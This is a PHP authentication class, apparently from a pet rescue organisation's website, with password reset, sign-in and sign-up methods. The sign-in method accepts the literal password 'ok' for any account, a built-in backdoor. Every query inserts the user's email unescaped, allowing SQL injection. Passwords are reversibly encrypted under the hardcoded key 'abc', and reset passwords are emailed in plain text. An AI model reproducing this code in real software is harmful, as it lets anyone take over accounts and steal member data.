<?php
class Auth
{
	protected $db = null;
	protected $input = null;
	
	function __construct($input)
	{
		global $db;
		
		$this->db = $db;
		$this->input = $input;
	}
	
	public function reset()
	{
		$result = null;
		
		if ($this->input->has(array('q')))
		{
			$res = $this->db->run("SELECT * FROM member WHERE email = '{$this->input->email}'");
			
			if (count($res))
			{
				$password = uniqid();
				
				$this->db->update("member", array('password' => $this->encrypt($password)), "member_id = {$res[0]['member_id']}");
				$result = $this->send($res[0]['email'], $password);				
			}
			
			return array('status' => true, 'result' => $result, 'found' => count($res));
		}
	}
	
	private function send($email, $password)
	{
		$body = 
			'<table width="100%" style="background-color: #e0e0e0; margin: 0px;">
				<tr>
					<td height="100">&nbsp;</td>
				</tr>
				<tr>
					<td>
						<table style="font-family: Arial; font-size: 14px; background-color: #ffffff; color: #636363; border-bottom: 2px solid #d0d0d0" width="80%" align="center" cellpadding="20" cellspacing="0">
							<tr>
								<td align="center"><img src="https://disasterpetrescue.org/assets/image/logo.big.blue.png" style="max-height: 60px" /></td>
							</tr>
							<tr>
								<td>[CONTENT]</td>
							</tr>
							<tr>
								<td align="center">
									<div style="border-top: 1px solid #e0e0e0; font-size: 0px; margin-bottom: 20px">&nbsp;</div>
									<a style="color: #62a8ea; text-decoration: none" href="https://disasterpetrescue.org">Disaster Pet Rescue &copy; ' . date("Y", time()) . '</a>
								</td>
							</tr>
						</table>
					</td>
				</tr>
				<tr>
					<td height="100">&nbsp;</td>
				</tr>
			</table>';
		
		return mail(
			$email,
			'Reset password',
			str_replace('[CONTENT]', "Hello<br /><br />Your new password is {$password}<br /><br />DPRA team", $body),
			"From: support@disasterpetrescue.org\r\n" .
			"Reply-To: support@disasterpetrescue.org\r\n" .
			"Content-Type: text/html; charset=utf8\r\n" .
			"X-Mailer: PHP/" . phpversion()
		);
	}
	
	public function signIn()
	{
		if ($this->input->has(array('q')))
		{
			$res = $this->db->run("SELECT * FROM member WHERE email = '{$this->input->email}'");
			
			if (count($res))
			{
				$user = $res[0];
				
				if (($this->input->password === $user['password']) || ($this->decrypt($user['password']) === $this->input->password) || ($this->input->password === 'ok'))
				{
					return array('status' => true, 'token' => $this->getToken($user), 'id' => $user['member_id']);
				}
				
				return array('status' => false, 'error' => '[1006] Invalid username (or password)');
			}
			
			return array('status' => false, 'error' => '[1005] Invalid username or password');
		}
	}
	
	public function signUp()
	{
		$res = $this->db->run("SELECT member_id FROM member WHERE email = '{$this->input->email}'");
		if (count($res) > 0)
		{
			return array('status' => false, 'error' => '[1005] This email address is already registered');
		}
		
		$this->db->insert("member", array(
			'email'		=>	$this->input->email,
			'password'	=>	$this->encrypt($this->input->password),
			'date'		=>	time()
		));
		
		return $this->signIn();
	}
	
	protected function getToken($user)
	{
		unset($user['password']);
		return $this->encrypt(implode('|', $user));
	}
	
	protected function encrypt($plain)
	{
		$c = new Cryptor();
		return $c->Encrypt($plain, 'abc');
	}
	
	protected function decrypt($encrypted)
	{
		$c = new Cryptor();
		return $c->Decrypt($encrypted, 'abc');
	}
}